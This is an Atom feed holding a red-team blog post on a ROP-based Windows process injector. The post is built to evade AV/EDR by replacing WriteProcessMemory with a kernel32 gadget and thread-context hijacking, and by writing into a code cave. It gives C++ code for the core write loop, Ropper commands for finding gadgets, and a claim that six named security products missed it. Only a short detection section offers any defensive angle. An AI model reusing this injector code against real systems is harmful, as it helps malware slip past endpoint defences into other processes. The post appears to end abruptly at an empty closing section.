<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-04T10:47:05-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Journals of a skid</title><subtitle>0 threats...wtf...</subtitle><author><name>Boudewijn Meijer</name><email>bcm.meijer@gmail.com</email></author><entry><title type="html">Rop Based injector</title><link href="http://localhost:4000/Rop-based-injector/" rel="alternate" type="text/html" title="Rop Based injector" /><published>2020-07-04T00:00:00-07:00</published><updated>2020-07-04T00:00:00-07:00</updated><id>http://localhost:4000/Rop-based%20injector</id><content type="html" xml:base="http://localhost:4000/Rop-based-injector/">&lt;h1 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;One of the many tricks in the red-teamer’s arsenal is &lt;a href=&quot;https://attack.mitre.org/techniques/T1055/&quot; title=&quot;Process Injection&quot;&gt;process injection&lt;/a&gt;. This technique is leveraged to get code to run in the address space of another process. There are multiple reasons as to why this would be desirable when attacking a computer or network. Among other things it can be used to bypass whitelisting, evade detection and increase stealthiness. This technique, however, is widely used and therefore widely known. Most of the decent antivirus and EDR-solutions have detection rules in place to stop injection from taking place. This post will introduce a new way of reaching succesful injection without it getting detected or stopped.&lt;/p&gt;

&lt;h2 id=&quot;how-does-avedr-detect-process-injection&quot;&gt;How does AV/EDR detect process injection?&lt;/h2&gt;
&lt;p&gt;Most of the injection techniques follow the same basic structure: allocating memory in the target process (&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex&quot; title=&quot;VirtualAllocEx&quot;&gt;VirtualAllocEx&lt;/a&gt;, &lt;a href=&quot;http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Section/NtMapViewOfSection.html&quot; title=&quot;NtMapViewOfSection&quot;&gt;NtMapViewOfSection&lt;/a&gt;), writing data to the allocated memory (&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory&quot; title=&quot;WriteProcessMemory&quot;&gt;WriteProcessMemory&lt;/a&gt;) and executing the written memory (&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls&quot; title=&quot;APC&quot;&gt;APC&lt;/a&gt;, &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread&quot; title=&quot;CreateRemoteThread&quot;&gt;CreateRemoteThread&lt;/a&gt;, Thread Hijacking). Because this order of steps is very common, it is relatively easy for the blue team (along with AV/EDR) to create rules that catch this behavior. Most of the time the first two steps are already enough to get caught.&lt;/p&gt;

&lt;h1 id=&quot;methods-of-process-injection&quot;&gt;&lt;strong&gt;Methods of process injection&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;We will take a look at how process injection can be achieved, and see what it can get caught on. In the following example, a valid handle to the target process with access rights set to ALL_ACCESS is already obtained.&lt;/p&gt;

&lt;p&gt;First, we need to allocate memory in the target process:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;VirtualAllocEx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MEM_RESERVE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MEM_COMMIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PAGE_READWRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The above call will allocate a piece of memory in the target process with the size of our payload and lets us read and write to it. An extra byte is added to the size to account for an appended nullbyte when writing strings.&lt;/p&gt;

&lt;p&gt;After having allocated the memory we want to write our payload to it, which can be done by calling the following function:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;WriteProcessMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We now have to think about what we have injected: is it actual code, or is it a path to a DLL on disk? If it is the former, we have to let the process load that DLL, which can be done with creating a thread with the entrypoint pointed to LoadLibrary, and with a pointer to the written buffer as argument. If it is the latter, we can create a thread with the entrypoint set to the start of our buffer. Keep in mind that for us to be able to execute our payload, we need execution rights on that piece of memory. This can be obtained by either calling &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex&quot; title=&quot;VirtualProtectEx&quot;&gt;VirtualProtectEx&lt;/a&gt; after allocation, or at the point of allocation. A little warning, though: AV does not like it when you allocate R+W+X memory in another process, so your best bet is to allocate with read/write, and later change it to read/execute.&lt;/p&gt;

&lt;p&gt;Creating a thread is very easy and can be done by calling the following:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;CreateRemoteThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Of course, it is important to check the returnvalues of the aforementioned functions.&lt;/p&gt;

&lt;p&gt;Other ways of process injection follow the above behaviour closely, but mostly differ by the way of executing the buffer (creating a thread, using an existing thread or using APC calls).&lt;/p&gt;

&lt;p&gt;What we want to achieve, however, is change the way of writing our payload into the buffer, so we can switch up the standard behavior and (hopefully) get past any detection mechanisms in place.&lt;/p&gt;

&lt;h1 id=&quot;the-method&quot;&gt;&lt;strong&gt;The method&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;We want to eliminate the call to WriteProcessMemory, but also know that &lt;a href=&quot;https://blog.ensilo.com/atombombing-brand-new-code-injection-for-windows&quot; title=&quot;atombombing&quot;&gt;atombombing&lt;/a&gt; is already detected. What we came up might be a little more intrusive than atombombing, but was something that many have might not thought of, or heard about before. The idea is pretty straight forward and easy to understand, even if you might not know the ins and outs of Windows, threads and the assembly language.&lt;/p&gt;

&lt;p&gt;The idea is to utilize a &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot; title=&quot;ropchain&quot;&gt;ropchain&lt;/a&gt; in the target process to write the value of a register into a buffer. If you do not know what a ropchain (or ropchaining) is, we highly recommend you look it up before you continue reading. What we are looking for is an assembly instruction that writes the value of a register to a dereferenced register (a pointer to our buffer).&lt;/p&gt;

&lt;p&gt;Using a great tool called &lt;a href=&quot;https://github.com/sashs/Ropper&quot; title=&quot;Ropper&quot;&gt;Ropper&lt;/a&gt; you can easily search for the needed gadgets, for example using the following command results in a gadget we can use:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ropper &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:/Windows/System32/kernel32.dll&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--search&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;mov [%], %; ret&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--quality&lt;/span&gt; 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov qword ptr [rdx], rcx
ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;!-- ![](img/gadget_1.png &quot;Gadget one&quot;) --&gt;

&lt;p&gt;In the above instruction the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcx&lt;/code&gt; gets moved into wherever &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdx&lt;/code&gt; is pointing to. After, it will return into whatever address is on top of the stack.
When attempting this method for the first time, we allocated a stack and set the stack pointer to point to it. This worked, however it’s very impractical. A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push&lt;/code&gt; instruction before the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov&lt;/code&gt; will help us out drastically. This way, if we place the address of our target instruction in this register, it gets pushed to the top of the stack. Now &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; will return into our specified address.&lt;/p&gt;

&lt;p&gt;Using ropper, we can search for a new gadget:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ropper &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:/Windows/System32/kernel32.dll&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--search&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;push %; mov [%], %; ret&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The above command finds a few gadgets we can use. For this example we will use the following instructions located at offset &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00000001800016be&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;push rax
mov qword ptr [r8 + 0x50], rcx
ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The next problem we faced is where to return into. The first guess was to return into the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitthread&quot; title=&quot;ExitThread&quot;&gt;ExitThread&lt;/a&gt; function, however this did not seem to work (because of register values) and would only be viable if we were not reusing the thread later on. The next call we used was &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleepex&quot; title=&quot;SleepEx&quot;&gt;SleepEx&lt;/a&gt;. Because of the &lt;a href=&quot;https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention&quot; title=&quot;Calling convention of x64&quot;&gt;calling convention of x64&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcx&lt;/code&gt; would be our time to sleep, which would be extremely long if it was holding the value of our buffer. This worked, however the thread did not want to wake up anymore. Making the thread wait was mandatory, though, so why not create and infinite loop ourselves? We can achieve this by pushing an address to the stack which contained a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jmp&lt;/code&gt; instruction to the same register we were pushing (in this case &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt;). 
What should happen is that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt; gets pushed to the stack, part of our data gets copied to the buffer and it returns into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jmp rax&lt;/code&gt; instruction. However, rax is never cleared, so it is still pointing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jmp rax&lt;/code&gt; and therefore jumps to itself, and this goes on forever.&lt;/p&gt;

&lt;p&gt;Now having successfully made the thread wait for us to give it new data, we can do so in a loop, with each time writing the amount of bytes that will fit in our register (on x64 this is 8 bytes).&lt;/p&gt;

&lt;p&gt;One catch, however, is that this takes time. A lot of time. This is because the thread will be writing part of the buffer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;size / 8&lt;/code&gt; times, and each iteration you have to wait to account for overhead.&lt;/p&gt;

&lt;p&gt;Here is an example of what a loop for the iterations could look like&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* zero the buffer */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
   
    &lt;span class=&quot;cm&quot;&gt;/* suspend the thread stuck in the infinite loop */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SuspendThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* copy part of the payload into buffer */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/*  set registers of thread */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Rip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;//address of our gadget&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;//address of our loop&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* subtract 0x50 from address. The gadget will add it back */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;R8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;this_thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DELAY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* Set the registers of the thread */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SetThreadContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CONTEXT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_hProc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;this_thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DELAY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* Resume the thread */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ResumeThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;this_thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DELAY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* increment value by size of register */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uintptr_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Play around with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DELAY&lt;/code&gt; and find a good value that works for you.&lt;/p&gt;

&lt;p&gt;The final part is executing our payload. As said before, this can either be a path to a DLL, or actual shellcode. Getting the dll loaded is not any harder than we have already been doing. All we have to do is set the instruction pointer to the start of &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya&quot; title=&quot;LoadLibraryA&quot;&gt;LoadLibrary&lt;/a&gt; with our argument (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcx&lt;/code&gt;) being a pointer to the start of our (now written) buffer.&lt;/p&gt;

&lt;p&gt;An added bonus when injecting a DLL is that we don’t need a big buffer to write our path into (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;C:\Temp\evil.dll&quot;&lt;/code&gt;, or maybe even &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;C:\evil.dll&quot;&lt;/code&gt;) and does not have to be placed in executable memory. This means that we can also look for locations in a module that we have read and write access to. Doing this will eliminate the call to allocate memory, leaving us only with calls to interact with the thread.&lt;/p&gt;

&lt;h2 id=&quot;getting-rid-of-memory-allocations&quot;&gt;getting rid of memory allocations&lt;/h2&gt;
&lt;p&gt;Lets do what the above suggests. We can achieve this by using an unused piece of memory in the target process (a so called &lt;a href=&quot;https://en.wikipedia.org/wiki/Code_cave&quot; title=&quot;codecave&quot;&gt;codecave&lt;/a&gt;). This memory has to be writable when mapped, though (this is no PE infection). Looking at the segments using a debugger, we can see the segments and their protection:
&lt;br /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/blogposts/rop_injector/segments.png&quot; alt=&quot;segments&quot; /&gt;
&lt;br /&gt;&lt;br /&gt;
Only the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.data&lt;/code&gt; segment has the writable flag set on it’s memory, and so this is the one we can (and will) use. Looking for a codecave is pretty trivial, and won’t be covered in this blogpost. Just make sure that you are searching for one in memory you can write to. A little trick you can use is searching for a codecave in either kernel32 or ntdll, since these are mapped at the same addresses across processes. This allows you to search for a codecave locally, and use the same found codecave address as the target buffer. 
&lt;br /&gt;
We now have eliminated the need to allocate memory, and thus removed one more syscall we can get flagged on!&lt;/p&gt;

&lt;h1 id=&quot;results&quot;&gt;&lt;strong&gt;Results&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;Testing this method against the following AV’s\EDR yielded promising results. Not one of the following products flagged, or stopped the injector:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. Avira
2. AVG
3. Avast
4. Eset
5. Malwarebytes
6. Microsoft ATP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;detection-methods&quot;&gt;&lt;strong&gt;Detection methods&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;This injector still makes some calls that can be flagged as malicious, like opening a thread and interacting with it (getting/setting the context and suspending/resuming the thread). Detecting this method would require manifacturers to write signatures to catch this behavior.&lt;/p&gt;

&lt;h1 id=&quot;final-thoughts&quot;&gt;&lt;strong&gt;final thoughts&lt;/strong&gt;&lt;/h1&gt;
